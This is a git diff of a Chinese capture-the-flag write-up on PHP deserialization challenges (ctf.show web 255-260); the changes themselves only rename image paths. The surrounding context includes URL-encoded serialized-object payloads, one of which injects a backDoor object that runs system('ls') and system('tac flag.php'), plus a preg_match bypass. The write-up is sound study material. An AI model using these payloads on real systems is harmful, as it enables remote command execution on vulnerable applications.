@@ -78,7 +78,7 @@ if(isset($username) && isset($password)){
 http://dd78310d-6f85-49a1-a642-ac58a05a72d9.challenge.ctf.show/?username=xxxxxx&password=xxxxxx
 ```
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -141,7 +141,7 @@ if(isset($username) && isset($password)){
 
 ```
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### ①代码解释
 
@@ -171,7 +171,7 @@ echo serialize($a);
 
 ```
 
-<figure><img src="../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 得到的结果为
 
@@ -189,7 +189,7 @@ O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%2
 cookie的内容需要url编码
 {% endhint %}
 
-<figure><img src="../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 然后我们的GET里面的参数还是
 
@@ -197,11 +197,11 @@ cookie的内容需要url编码
 http://e3d28ae1-883e-408a-a621-5799c1ada8fd.challenge.ctf.show/?username=xxxxxx&password=xxxxxx
 ```
 
-<figure><img src="../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 得到flag
 
-<figure><img src="../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -265,7 +265,7 @@ if(isset($username) && isset($password)){
 
 ```
 
-<figure><img src="../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### ①代码解释
 
@@ -297,7 +297,7 @@ echo urlencode(serialize($a));
 O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22password%22%3Bs%3A3%3A%22456%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
 ```
 
-<figure><img src="../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 传入GET的结果是
 
@@ -305,7 +305,7 @@ O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A3%3A%22123%22%3
 http://65180760-7f41-4368-9d05-130363fbfb54.challenge.ctf.show/?username=123&password=456
 ```
 
-<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## <mark style="color:blue;background-color:purple;">(4)WEB 257</mark>
 
@@ -372,7 +372,7 @@ if(isset($username) && isset($password)){
 
 ```
 
-<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### ①代码解释
 
@@ -426,7 +426,7 @@ echo urlencode(serialize($a));
 
 ```
 
-<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A13%3A%22system%28%22ls%22%29%3B%22%3B%7D%7D
@@ -434,7 +434,7 @@ O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs
 
 然后我们将这个写入到cookie里面，
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 然后我们再写入GET参数
 
@@ -442,7 +442,7 @@ O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs
 http://4e682701-7827-469b-b19a-e1fa65731ba8.challenge.ctf.show/?username=xxxxxx&password=xxxxxx
 ```
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 这里我们首先写入的是ls命令，我们看到flag.php文件，所以我们查看flag.php
 
@@ -452,11 +452,11 @@ http://4e682701-7827-469b-b19a-e1fa65731ba8.challenge.ctf.show/?username=xxxxxx&
 O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%22tac+flag.php%22%29%3B%22%3B%7D%7D
 ```
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 最后得到flag。
 
-<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## <mark style="color:blue;background-color:purple;">（5）web 258</mark>
 
@@ -521,7 +521,7 @@ if(isset($username) && isset($password)){
 
 ```
 
-<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### ①代码解释
 
@@ -568,7 +568,7 @@ if(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){
 
 ```
 
-<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### ①代码解释
 
@@ -582,7 +582,7 @@ if(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){
 http://7b449c38-ff6e-4537-8613-49e9378f741e.challenge.ctf.show/?ctfshow[]='ctfshow_i_love_36D'
 ```
 
-<figure><img src="../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 （7）
 
